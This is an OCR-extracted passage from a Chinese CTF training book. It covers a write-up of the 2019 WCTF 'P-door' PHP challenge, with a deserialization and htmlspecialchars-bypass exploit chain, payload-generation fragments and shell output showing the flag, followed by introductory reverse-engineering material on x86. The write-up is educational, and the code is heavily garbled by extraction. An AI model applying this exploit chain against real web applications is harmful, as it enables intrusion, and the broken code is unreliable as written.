php>echotimeO）."&&".microtime(true);
1563883588&&1563883588.732
图8-5microtime返回格式
可以设置一个提前时间量用于批量创建文件夹，然后就可以用
---
## Page 199
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
199/1144
Burp或自写脚本进行爆破，直到找到目录，达到任意写文件的目的。
在确认可任意写文件之后，还需要控制文件的内容，接下来是审
计相关代码：
Cache:writeToFile（Spath,$this);
注意，writeFile方法的第二个参数是$this，再次查看writeToFile
方法，可以发现如下关键代码：
file_put_contents($path,Scontent);
此处会触发魔法方法_toString方法（参见5.1.2节关于反序列化
漏洞的相关内容）：
public function_toString():string{
return $this->render();
并在_toString方法中触发render方法，render方法代码如下：
public function render():string{
$user=User:getlnstance();
if(!array_key_exists($this->template,self:TEMPLATES))
die("lnvalid template");
---
## Page 200
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
200/1144
$tpl = self:TEMPLATES[Sthis->template];
$this->view= array();
$this->viewcontent']=file getcontents(Stpl)
$this->vars["text']=$this->text."n";
$this->vars"rendered"]=microtime(true);
$content =$this->renderVars();
$header=$this->getHeader();
return $header.$content;
可以看到，render方法体中倒数第三行对content进行了处理：
Scontent=$this->renderVars();
所以我们跟进renderVars方法，看看处理规则是怎样的
renderVars方法代码如下：
publicfunctionrenderVars():string{
$content=Sthis->viewcontent"];
foreach(Sthis->vars as Sk=>Sv)
$v=htmlspecialchars($v);
$content=str_replace("@@$k@@",$v,Scontent);
return$content;
可以发现foreach循环体中第二行会对content进行编码：
Sv = htmlspecialchars($v);
---
## Page 201
CTF特训营：技术详解、解题方法与
B.42019WCTF大师赛赛题剖析：P-door
201/1144
此处调用了一个HTML字符实体编码的方法，那么现在的难点在
于，我们无法构造出phptag来写入文件，因为htmlspecialchars方法
会将“
图8-6HTML字符实体
所以，这里就需要巧妙地构造出一个不被转义的phptag，从
renderVars方法中可以看到，返回的Scontent在过滤前会被Sthis
>view["content'"赋值。
如果我们能在赋值之前控制$this->view，将其变成字符串而非数
组，那么便可以绕过过滤（如图8-7所示），这里需要用到2017GCTF
中的一个方法（可参考https://skysec.top/2017/06/20/GCTF中与PHP
反序列化相关的题目）。
---
## Page 202
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
202/1144
$v){
$v=htmlspecialchars($v）;
$content=str_replace("@@$k@a"，$v,$content）;
9
10
return $content;
11
12
13
var_dump(renderVars());
string(1)“vars[text]=&Sthis
>view；”，此时只要改变Stext的值，即可达到更改Sthis->view的目
的。我们可以在doSaveDraft方法中看到Stext并没有被过滤，所以可
以构造：
Stext=text=$payload[$i];
$p->vars["text"]=&$p->view;
if (I$expl)
:ds=Idxes
else{
$p->header=Sexpl;
:ds=Idxes
}
return serialize($expl);
gen_payload($PAYLOAD);
---
## Page 204
CTF特训营：技术详解、解题方法与
8.42019WCTF大师赛赛题剖析：P-door
204/1144
这样就可以非常巧妙地拼接出Payload了，如图8-8所示。
37
$this->view["content"]
=file_get_contents
38
39
40
$this->vars["rendered"]=microtime(true);
41
42
$content=$this->renderVars(）;
43
$header=$this->getHeader();
44
var_dump($content);
45
return $header.$content;
46
47
string(1)
string(1)
"E"
string（1)"R"
string(1)
string(1)"s"
string（1）"（“
string(1)
"7"
string(1)
"a"
string(1)
"v"
string(1)
"e"
string(1)
string（1)"p"
string(1)"h"
string(1)"p"
string（1)“?"
string（1）“"
string(25)"”的时候，
还使用了一个技巧，可以使用_halt_compiler方法让编译器停止继续
向下编译，如图8-10所示。
~php
^D
Parseerror:syntaxerror,unexpectedendoffilein-online2
图8-9无关数据导致的编译失败
~php
]b'+OK\r\n'
[]b'+OK\r\n'
[]b's0\r\n\r\n
What dou want，[i]nteractive shell or [r]everse shell:i
[info]Interact mode start，enter"exit"toquit.
b'$29\r\nwctf{cAn_YOU_FinD_THE_F7a6?}\n\r\n
wCtf{cAn_YOU_FinD_THE_F7a6?}
[
图8-12获得flag
---
## Page 207
CTF特训营：技术详解、解题方法与
本筒小结
207/1144
本篇小结
本篇主要介绍了CTF比赛中常用的工具及常见题自的考点，由于
Web题目通常是灵活多变的，所以本篇无法面面俱到地为大家讲解。
在解答Web题自的时候，除了前面讲到的各种知识点，还应该考
虑题自上下文的系统特性、语言特性、版本特性、程序处理机制等因
素。
大家还可以自行阅读《白帽子讲Web安全》《SQL注入攻击与防
御》《黑客攻防技术宝典一Web实战篇》《Web前端黑客技术与揭
秘》等相关书籍，并关注国内外最新的安全焦点，来进一步学习Web
安全的相关知识
在参加CTF比赛或做CTF练习题的时候，更多的是需要靠积累的
经验来判断出题人的考点是什么，而本篇的主要自的也是希望帮助读
者在遇到Web题目时能有一个正确的思考方法。
---
## Page 208
CTF特训营：技术详解、解题方法与
第二篇CTF之Reverse
208/1144
第二篇CTF之Reverse
Reverse即软件逆向工程，是对编译成型的二进制程序进行代码、
逻辑和功能分析的过程。在CTF比赛中，Reverse类型的题目主要考
察选手的软件静态分析和动态调试能力，要求选手有较强的程序代码
分析能力，同时对反调试、代码混淆等对抗技术有一定的了解。
---
## Page 209
CTF特训营：技术详解、解题方法与
第9章Reverse概述
209/1144
第9章Reverse概述
本章将讲解逆向分析的主要方法、汇编指令体系结构和常用逆向
分析工具。
---
## Page 210
CTF特训营：技术详解、解题方法与
9.1逆向分析的主要方法
210/1144
9.1逆向分析的主要方法
逆向分析主要是将二进制机器码进行反汇编得到汇编代码，在汇
编代码的基础上进行功能分析。经过反编译生成的汇编代码中缺失了
源代码中的符号、数据结构等信息，因此需要尽可能地通过逆向分析
还原以上信息，以便分析程序原有的逻辑和功能。逆向分析的主要方
法包括静态分析法和动态分析法。
1.静态分析法
静态分析法是在不执行代码文件的情形下，对代码进行静态分析
的一种方法。静态分析时并不执行代码，而是观察代码文件的外部特
性，主要包括文件类型分析和静态反汇编、反编译。
文件类型分析主要用于了解程序是用什么语言编写的或者是用什
么编译器编译的，以及程序是否被加密处理过。
在逆向过程中，主要是使用反汇编工具查看内部代码，分析代码
结构。
2.动态分析法
---
## Page 211
CTF特训营：技术详解、解题方法与
9.1逆向分析的主要方法
211/1144
动态分析法是在程序文件的执行过程中对代码进行动态分析的一
种方法，其通过调试来分析代码，获取内存的状态等。在逆向过程中，
通常使用调试器来分析程序的内部结构和实现原理。
注意：在CTF中，常见的逆向自标为Windows、Linux平台下的
x86、x64二进制可执行程序，本章中也只针对Windows和Linux平台
下的逆向分析进行介绍。
---
## Page 212
CTF特训营：技术详解、解题方法与
9.2汇编指令体系结构
212/1144
9.2汇编指令体系结构
因为逆向分析的程序所使用的处理器架构通常为lnte架构，所以
这里对lntelx86和x64指令体系做一个简单的介绍，包括寄存器组
指令集、调用规范。
---
## Page 213
CTF特训营：技术详解、解题方法与
9.2.1x86指令体系
213/1144
9.2.1x86指令体系
1.寄存器组
x86指令体系中的寄存器组具体如下。
通用寄存器：包括EAX、EBX、ECX、EDX、ESI、EBP
ESP。
指令指针寄存器（EIP）：指向当前要执行的指令。
状态标识寄存器（EFLAGS）：根据状态标识寄存器中状态的值
控制程序的分支跳转。
段寄存器：CS、DS、SS、ES、FS、GS。在当前的操作系统
中，CS、DS、SS和ES的段寄存器的基地址通常为0
特殊寄存器：包括DRO-DR7，用于设置硬件断点。
2.汇编指令集
x86汇编代码有两种语法记法：Inte和AT&T。常用的逆向分析工
具IDAPro、Ollydbg和MASM通常使用Intel记法，而UNIX系统上的工
---
## Page 214
CTF特训营：技术详解、解题方法与
9.2.1x86指令体系
214/1144
具gcc通常遵从AT&T记法。Intel记法在实践中占据统治地位，也是本
书中使用的记法。
Intel的汇编语言程序语句格式为：
操作项目的操作数，源操作数
其中，操作项一般是汇编语言中的一些指令，比如add（加
法）、mov（移动）等指令。目的操作数和源操作数一般都是寄存器
内存地址或者立即数。